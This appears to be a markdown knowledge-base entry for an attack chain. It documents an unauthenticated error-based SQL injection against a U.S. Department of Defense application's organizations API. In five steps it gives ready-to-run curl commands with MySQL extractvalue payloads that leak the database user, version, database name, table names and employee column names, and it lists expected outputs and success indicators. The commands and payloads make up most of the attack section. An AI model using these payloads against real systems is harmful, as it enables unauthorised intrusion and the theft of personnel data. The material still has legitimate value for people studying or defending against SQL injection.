---
id: ac-uuid-001
name: >-
  Unauthenticated SQL Injection to Extract Database Schema via MySQL Error
  Messages
type: attack_chain
description: >-
  Multi-stage unauthenticated SQL injection attack exploiting a vulnerable API
  endpoint to leak database user, version, name, tables, and columns through
  error-based extraction using MySQL's extractvalue function.
verified: false
submitted: true
step_count: 5
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.510Z'
procedures:
  - '[[procedures/Leak-Database-User-via-SQL-Injection]]'
  - '[[procedures/Leak-MySQL-Version-via-SQL-Injection]]'
  - '[[procedures/Leak-Current-Database-Name-via-SQL-Injection]]'
  - '[[procedures/Extract-Table-Names-from-Information-Schema]]'
  - '[[procedures/Dump-Column-Names-from-Employee-Table]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Credential Dumping]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
  - '[[Collection]]'
tags:
  - sqli
  - mysql
  - prisma
  - database-leak
  - unauthenticated
  - error-based
platforms:
  - Web
  - MySQL
tools: []
complexity: medium
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Credential Dumping]]'
---

# Unauthenticated SQL Injection to Extract Database Schema via MySQL Error Messages

Multi-stage attack chain demonstrating an unauthenticated SQL injection vulnerability in a U.S. Department of Defense application's /api/organizations/* endpoint, allowing arbitrary SQL payloads to leak sensitive database information through error messages triggered by MySQL's extractvalue function via Prisma's queryRaw.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Inject SQL Payload] --> B[Discovery: Leak User and Version]
    B --> C[Discovery: Leak Database Name]
    C --> D[Collection: Extract Tables]
    D --> E[Collection: Dump Columns]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[commands/curl-leak-user]]
- [[commands/curl-leak-version]]
- [[commands/curl-leak-database]]
- [[commands/curl-extract-tables]]

### Target Environment

- Web application with Prisma ORM and MySQL 8.0.23 backend
- Exposed /api/organizations/* endpoint
- No authentication required

### Initial Access Requirements

- Network access to the target host (e.g., port 443 for HTTPS)
- No credentials needed (unauthenticated)
- Basic knowledge of SQL injection payloads

## Detailed Attack Procedures

### Step 1: Leak Database User
procedure: [[procedures/Leak-Database-User-via-SQL-Injection]]

**Objective**: Inject an SQL payload to trigger an error that leaks the current database user.

**Instructions**: Send a crafted GET request to the vulnerable endpoint using [[commands/curl-leak-user]] to inject the payload after the organization ID parameter.

```bash
curl -X GET "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa" -H "User-Agent: Mozilla/5.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
```

**Expected Output**: HTTP 500 error with XPATH syntax error message containing the database user, e.g., 'XPATH syntax error: ":user@host"'.

**Success Indicators**:
- 500 Internal Server Error response
- Error message leaks database user via Prisma queryRaw

### Step 2: Leak MySQL Version
procedure: [[procedures/Leak-MySQL-Version-via-SQL-Injection]]

**Objective**: Modify the payload to extract the MySQL server version through the error message.

**Instructions**: Update the SELECT clause in the payload to version() and execute using [[commands/curl-leak-version]].

```bash
curl -X GET "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+version()))))=1--%20aa" -H "Host: target.com"
```

**Expected Output**: Error message revealing MySQL version, e.g., 8.0.23.

**Success Indicators**:
- Version information in error output
- Confirms MySQL backend

### Step 3: Leak Current Database Name
procedure: [[procedures/Leak-Current-Database-Name-via-SQL-Injection]]

**Objective**: Extract the name of the current database using database().

**Instructions**: Adjust the payload to select database() and send via [[commands/curl-leak-database]].

```bash
curl -X GET "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+database()))))=1--%20aa" -H "Host: target.com"
```

**Expected Output**: Error message with database name, e.g., 'XPATH syntax error: ":dbname"'.

**Success Indicators**:
- Database name leaked in response
- Validates target database

### Step 4: Extract Table Names
procedure: [[procedures/Extract-Table-Names-from-Information-Schema]]

**Objective**: Query information_schema.tables to enumerate table names, using LIMIT for pagination.

**Instructions**: Craft payload to select table_name and execute with [[commands/curl-extract-tables]].

```bash
curl -X GET "https://target.com/api/organizations/'or(extractvalue(1,concat(1,(select(table_name)from information_schema.tables limit 54,1))))='" -H "User-Agent: Mozilla/5.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
```

**Expected Output**: Error leaking table names like 'task_header', 'employee'.

**Success Indicators**:
- Table names visible in error
- Schema enumeration begins

### Step 5: Dump Column Names from Employee Table
procedure: [[procedures/Dump-Column-Names-from-Employee-Table]]

**Objective**: Query information_schema.columns for columns in the 'employee' table.

**Instructions**: Build payloads targeting columns for 'employee' table, similar to previous steps, iterating with SELECT column_name FROM information_schema.columns WHERE table_name='employee'.

```bash
curl -X GET "https://target.com/api/organizations/'or(extractvalue(1,concat(1,(select(column_name)from information_schema.columns where table_name='employee' limit 0,1))))='" -H "Host: target.com"
```
(Repeat with LIMIT offsets to dump all columns)

**Expected Output**: Columns like 'employee_edipi', 'employee_email', 'employee_rank_id' leaked.

**Success Indicators**:
- Full column list extracted
- Potential for data dumping

## Attack Chain Summary

### Key Achievements

1. Unauthenticated access to leak database credentials and metadata
2. Complete schema enumeration including tables and columns
3. Critical impact enabling full data exfiltration from DoD application

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Credential Dumping]] OS Credential Dumping (adapted for DB)

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Discovery]] Discovery
- [[Collection]] Collection

---
*Last updated: 2023-10-01T00:00:00Z*
